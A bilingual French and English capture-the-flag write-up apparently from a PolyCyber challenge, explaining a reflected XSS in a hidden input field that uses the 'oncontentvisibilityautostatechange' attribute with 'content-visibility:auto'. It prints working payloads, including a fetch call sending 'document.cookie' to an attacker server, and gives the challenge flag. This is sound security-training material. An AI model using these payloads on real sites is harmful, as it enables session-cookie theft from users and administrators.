# Concealed Warehouse

## Write-up - FR

### Reconnaissance

En naviguant sur le site, on identifie plusieurs pages :
- Une page de consultation d'inventaire (`/inventory`)
- Une page permettant de signaler une URL à l'administrateur (`/report`)

La page `/report` accepte une URL, affiche un message de validation, et laisse entendre qu'un administrateur va consulter le lien soumis.

Cela suggère immédiatement une attaque de type XSS.

### Étude des entrées utilisateur

Sur la page d'inventaire, un paramètre `warehouse` est utilisé pour sélectionner un entrepôt.

Observations :

- Le paramètre est reflété dans la page HTML dans un `<input type="hidden">`

- Certains caractères sont filtrés (`<` et `>`), mais les guillemets restent autorisés


Le filtrage est partiel et laisse supposer un XSS contournable sans balises HTML.

### Hidden XSS

Mais l'injection dans un tag caché empêche des évènements classique comme `onmouseover` ou `onfocus` de déclencher la XSS :

```html
<input type="hidden" name="warehouse" value="" onfocus=alert(1337)>
```

Heureusement pour nous il existe tout de même [des attributs HTML qui peuvent s'exécuter automatiquement dans ce contexte](https://medium.com/@chor4o/exploring-an-xss-vulnerability-in-a-hidden-parameter-099f8916cb9a) ! C'est le cas du couple d'attribut `oncontentvisibilityautostatechange` et `style="content-visibility:auto"
`.

On peut notamment injecter cette charge :
```html
" oncontentvisibilityautostatechange=alert(1337) style="content-visibility:auto
```

Ce qui nous donne l'URL suivante :
```html
/inventory?warehouse=%22%20oncontentvisibilityautostatechange%3dalert(1337)%20style%3d%22content-visibility%3aauto
```

Et on obtient alors dans le contenu de la page :

```html
<input type="hidden" name="warehouse" value="" oncontentvisibilityautostatechange=alert(1337) style="content-visibility:auto>
```

![`alert` déclenché !](img/alert.png)

Et on a notre XSS ! Plus qu'à exfiltrer les cookies de l'administrateur en modifiant le JS dans l'attribut `oncontentvisibilityautostatechange` pour obtenir le contenu suivant :

```html
<input type="hidden" name="warehouse" value="" oncontentvisibilityautostatechange=fetch("https://monserveur/?c="+document.cookie) style="content-visibility:auto>
```

On forge ensuite l'URL malveillante et on l'envoi à l'administrateur via la page `/report`.

Une fois que le bot admin visite l'URL fournie, ses cookies (contenant le flag) sont envoyés à notre serveur.

---

## Write-up - EN

### Reconnaissance

While browsing the website, we can identify several pages:

* An inventory consultation page (`/inventory`)
* A page allowing users to report a URL to the administrator (`/report`)

The `/report` page accepts a URL, displays a confirmation message, and clearly suggests that an administrator will visit the submitted link.

This immediately points toward a potential **XSS attack vector**.

### User Input Analysis

On the inventory page, a `warehouse` parameter is used to select a warehouse.

Observations:

* The parameter is reflected in the HTML page inside an `<input type="hidden">`
* Some characters are filtered (`<` and `>`), but quotation marks are still allowed

The filtering is therefore partial and suggests that an XSS might still be possible **without using HTML tags**.

### Hidden XSS

However, the injection occurs inside a hidden input field, which prevents classic event handlers like `onmouseover` or `onfocus` from triggering the XSS:

```html
<input type="hidden" name="warehouse" value="" onfocus=alert(1337)>
```

Since the element is hidden, these events will never fire.

Fortunately, there are still [HTML attributes that can execute automatically in this context](https://medium.com/@chor4o/exploring-an-xss-vulnerability-in-a-hidden-parameter-099f8916cb9a)!

In particular, the combination of:

* `oncontentvisibilityautostatechange`
* `style="content-visibility:auto"`

allows JavaScript execution without user interaction.

We can inject the following payload:

```html
" oncontentvisibilityautostatechange=alert(1337) style="content-visibility:auto
```

Which gives the following URL:

```html
/inventory?warehouse=%22%20oncontentvisibilityautostatechange%3dalert(1337)%20style%3d%22content-visibility%3aauto
```

This results in the following HTML being rendered:

```html
<input type="hidden" name="warehouse" value="" oncontentvisibilityautostatechange=alert(1337) style="content-visibility:auto>
```

![`alert` triggered !](img/alert.png)

And we now have a working XSS!

All that remains is to exfiltrate the administrator's cookies by modifying the JavaScript inside the `oncontentvisibilityautostatechange` attribute:

```html
<input type="hidden" name="warehouse" value="" oncontentvisibilityautostatechange=fetch("https://myserver/?c="+document.cookie) style="content-visibility:auto>
```

Finally, we craft the malicious URL and submit it to the administrator via the `/report` page.

Once the admin bot visits the page, the cookies (containing the flag) are sent to our server.

---

## Flag

`polycyber{H1dd3n_X55_F0und_rQ45e4bK}`
